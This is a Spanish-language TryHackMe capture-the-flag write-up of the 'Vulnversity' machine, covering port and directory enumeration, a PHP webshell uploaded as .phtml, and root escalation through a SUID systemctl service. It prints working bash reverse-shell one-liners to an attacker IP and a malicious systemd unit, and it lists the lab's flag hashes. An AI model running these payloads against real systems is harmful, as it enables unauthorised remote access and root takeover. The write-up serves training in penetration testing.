# 💻 Vulnversity

> 🔊 Plataforma: TryHackMe  
> 🛡️ Nivel de dificultad: Fácil  
> 💡 Preparación OSCP - **igneosec**

---

## 🗓️ Información general

- **Nombre de la máquina**: Vulnversity
- **Dirección IP**: 10.10.79.169
- **Sistema operativo**: Linux (Ubuntu)
- **Tipo de acceso / Vector de entrada**: Subida de archivo web (formulario) → Webshell → Privesc via systemctl

---

## 🔍 Enumeración

### 🔹 Escaneo de puertos

```bash
nmap -sS -v -n -p- --min-rate=5000 -oN firstscan 10.10.79.169 -Pn
```

Puertos relevantes:

- `21/tcp` → FTP (vsftpd 3.0.3)
- `22/tcp` → SSH (OpenSSH 7.2p2)
- `139, 445/tcp` → Samba 4.3.11
- `3128/tcp` → Squid Proxy 3.5.12
- `3333/tcp` → HTTP (Apache 2.4.18)

```bash
nmap -sCV -p21,22,139,445,3128,3333 -oN targetscan 10.10.79.169
```

---

## 🧐 Enumeración web

### 🔹 Escaneo con Gobuster

Para identificar rutas internas en el sitio web, se utilizó `gobuster`:

```bash
gobuster dir -u http://10.10.79.169:3333 -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
```

Resultados clave:

- `/internal/` → página con formulario de subida
- `/internal/uploads/` → ubicación accesible de los archivos subidos
- `/css/`, `/js/`, `/images/` → recursos estáticos

### 🔹 Análisis manual posterior
- Se identificó un formulario de subida en `http://10.10.79.169:3333/internal`.
- Se probaron extensiones alternativas y se validó que `.phtml` era aceptada y ejecutada como PHP.
- Se accedió a los archivos subidos vía navegador en `/internal/uploads/`, confirmando ejecución remota.

---

## 💀 Explotación inicial

Tras probar subir varias extensiones al formulario, se descubrió que aceptaba `.phtml`, lo cual indicaba una validación débil de extensiones.

Además, los archivos subidos eran accesibles desde `/internal/uploads/`, sin restricciones de permisos ni autenticación. Estas condiciones hacían viable el uso de una reverse shell en formato `.phtml`.


### 🔥 Subida de Webshell:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.21.164.206/4444 0>&1'");
?>
```

- El archivo fue subido como `shell.phtml`.
- Acceso vía: `http://10.10.79.169:3333/internal/uploads/shell.phtml`
- Se obtuvo reverse shell como `www-data`.

---

## 📦 Post-Explotación

El proceso de escalada comenzó con la búsqueda de binarios con el bit SUID activado:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Se detectó `/bin/systemctl` con SUID. Esto es crítico, ya que `systemctl` permite iniciar servicios como root. Al tenerlo con SUID, cualquier usuario puede abusarlo para ejecutar scripts arbitrarios como root.

Otros binarios SUID como `/bin/mount` o `/bin/ping` se descartaron por ser menos prácticos sin argumentos adicionales o sin configuraciones auxiliares. `systemctl` era la opción más directa y efectiva.

Este enfoque se eligió por varias razones:
- No requiere credenciales ni exploits externos.
- Utiliza herramientas ya presentes en el sistema.
- Permite una ejecución directa del payload con privilegios elevados.

### ⚙️ Preparación del entorno de escalada

#### Creación del script de reverse shell:

```bash
echo '#!/bin/bash
bash -i >& /dev/tcp/10.21.164.206/4445 0>&1' > /tmp/rootrev.sh
chmod +x /tmp/rootrev.sh
```

#### Creación del servicio malicioso:

```bash
cat << EOF > /tmp/rootrev.service
[Unit]
Description=Root Reverse Shell

[Service]
Type=simple
ExecStart=/tmp/rootrev.sh

[Install]
WantedBy=multi-user.target
EOF
```

### 🧪 Problemas enfrentados y solución

1. **Error: `mount not found`**
   - Se intentó `systemctl start /tmp/rootrev.service`
   - Error: `Unit tmp-rootrev.service.mount not found`
   - Solución: usar `systemctl link` y luego `start` sin usar rutas completas como nombre de unidad.

2. **Error: `Too many levels of symbolic links`**
   - Ocurrió al hacer múltiples pruebas con el mismo nombre de servicio.
   - Solución: cambiar nombre del servicio (`new_rootrev.service`).

### ✅ Ejecución final exitosa

```bash
systemctl link /tmp/rootrev.service
systemctl start rootrev.service
```

- Se obtuvo shell como `root` en el puerto 4445.

---

## 🌟 Flags encontradas

### 🧾 Flag de usuario

```bash
cat /home/bill/user.txt
```

`8bd7992fbe8a6ad22a63361004cfcedb`

### 🧾 Flag de root

```bash
cat /root/root.txt
```

`a58ff8579f0a9270368d33a9966c7fd5`

---

## 📚 Lecciones aprendidas

- **Formularios de subida**: no asumir que bloquean todas las extensiones. `.phtml` es frecuentemente olvidada por validaciones básicas y puede ejecutarse como PHP.

- **Abuso de `systemctl` con SUID**: si está mal configurado, es una escalada directa. Crear servicios propios apuntando a scripts controlados permite ejecución como root.

- **Errores comunes en `systemd`**:
  - `Too many symbolic links` → conflicto al reusar nombres de unidad o enlaces rotos.

- **Debugging con `journalctl`**: imprescindible revisar logs de servicios fallidos para entender por qué no se ejecutan.

---

📄 Writeup realizado por **igneosec**

📊 Parte del laboratorio ofensivo: [https://github.com/igneosec](https://github.com/igneosec)

